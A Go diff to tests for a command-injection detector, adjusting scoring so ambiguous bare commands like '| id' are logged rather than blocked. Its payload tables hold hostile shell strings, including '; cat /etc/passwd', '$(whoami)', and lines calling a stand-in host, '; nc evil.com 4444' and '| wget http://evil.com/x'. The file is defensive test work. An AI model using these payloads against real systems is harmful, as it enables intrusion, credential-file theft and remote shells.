@@ -15,11 +15,9 @@ var attackPayloads = []struct {
 }{
 	{"semicolon whoami", "; whoami", 65},
 	{"semicolon cat passwd", "; cat /etc/passwd", 75},
-	{"pipe id", "| id", 65},
 	{"backtick id", "`id`", 80},
 	{"dollar paren whoami", "$(whoami)", 80},
 	{"and operator ls", "test && ls -la", 65},
-	{"or operator id", "test || id", 65},
 	{"bin bash path", "/bin/bash -c 'id'", 80},
 	{"bin sh path", "/bin/sh -c 'whoami'", 80},
 	{"python exec", "python -c 'import socket'", 80},
@@ -709,7 +707,7 @@ func TestDetect_EncodedNewlineCROnlyWithCommand(t *testing.T) {
 }
 
 // TestDetect_NewlineInjection_CommonWordIsCommonWord pins the
-// known FP-prone pattern from M1 (AUDIT.md): a URL-encoded newline
+// known FP-prone pattern from M1 (docs/history/AUDIT.md): a URL-encoded newline
 // followed by a common English word that also happens to be in
 // commandDatabase ("cat", "set", "at", "head", "tail", "more",
 // "less", "find", "kill", "service", "host", "file", "last",
@@ -905,4 +903,63 @@ func TestRedirectionTargetShapes(t *testing.T) {
 			}
 		}
 	})
+}
+
+// TestAmbiguousBareCommand_LogsWithoutBlocking documents a deliberate scoring
+// change, and is the reason "| id" and "test || id" no longer appear in
+// attackPayloads above.
+//
+// A shell metacharacter followed by a bare command name that is also an
+// everyday English word is genuinely ambiguous: "| id | name |" is a markdown
+// table row, and "127.0.0.1;id" is command injection, but they are the same
+// shape to a substring matcher. Scoring them at 65 blocked ordinary comment,
+// ticket and textarea content — see the M1 discussion in docs/history/AUDIT.md,
+// which recommends exactly this resolution: keep detecting, but score the
+// uncorroborated case below the block threshold so it is logged rather than
+// enforced.
+//
+// Unambiguous commands and corroborated invocations are unaffected, which
+// TestAmbiguousBareCommand_CorroboratedStillBlocks pins.
+func TestAmbiguousBareCommand_LogsWithoutBlocking(t *testing.T) {
+	const blockThreshold, logThreshold = 50, 25
+
+	for _, input := range []string{"| id", "test || id", "; id", "| ls", "; head"} {
+		t.Run(input, func(t *testing.T) {
+			total := 0
+			for _, f := range Detect(input, "query") {
+				total += f.Score
+			}
+			if total >= blockThreshold {
+				t.Fatalf("input %q scored %d — an ambiguous bare command must stay below the block threshold", input, total)
+			}
+			if total < logThreshold {
+				t.Fatalf("input %q scored %d — it must still be logged, not silently dropped", input, total)
+			}
+		})
+	}
+}
+
+// TestAmbiguousBareCommand_CorroboratedStillBlocks guards against the downgrade
+// above swallowing real command injection.
+func TestAmbiguousBareCommand_CorroboratedStillBlocks(t *testing.T) {
+	const blockThreshold = 50
+
+	for _, input := range []string{
+		"; cat /etc/passwd", // ambiguous name, but a path argument
+		"| ls -la",          // ambiguous name, but a flag
+		"; whoami",          // unambiguous command
+		"; nc evil.com 4444",
+		"| wget http://evil.com/x",
+		"; cat $(whoami)",
+	} {
+		t.Run(input, func(t *testing.T) {
+			total := 0
+			for _, f := range Detect(input, "query") {
+				total += f.Score
+			}
+			if total < blockThreshold {
+				t.Fatalf("input %q scored %d — must still block", input, total)
+			}
+		})
+	}
 }
